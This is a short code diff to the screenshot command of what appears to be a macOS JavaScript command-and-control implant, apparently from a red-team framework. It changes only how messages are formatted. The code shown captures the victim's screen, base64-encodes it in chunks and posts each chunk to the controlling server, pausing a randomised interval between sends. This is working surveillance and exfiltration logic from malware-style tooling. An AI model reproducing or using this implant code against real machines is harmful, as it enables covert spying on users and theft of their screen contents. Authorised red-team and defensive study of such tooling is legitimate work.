@@ -16,7 +16,7 @@ exports.screenshot = function(task, command, params){
         let fileSize = parseInt(capture.length);
         // always round up to account for chunks that are < chunksize;
         let numOfChunks = Math.ceil(fileSize / chunkSize);
-        let registerData = {'total_chunks': numOfChunks, 'task': task.id, "is_screenshot": true};
+        let registerData = {"download": {'total_chunks': numOfChunks, "is_screenshot": true}, 'task': task.id};
         let registerFile = C2.postResponse(task, registerData);
         if (registerFile['responses'][0]['status'] === "success"){
             let currentChunk = 1;
@@ -24,7 +24,7 @@ exports.screenshot = function(task, command, params){
             let data = capture.subdataWithRange($.NSMakeRange(offset, csize));
             while(parseInt(data.length) > 0 && offset < fileSize){
                 // send a chunk
-                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['responses'][0]['file_id']};
+                let fileData = {"download": {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'file_id': registerFile['responses'][0]['file_id']}, 'task': task.id};
                 C2.postResponse(task, fileData);
                 $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
 
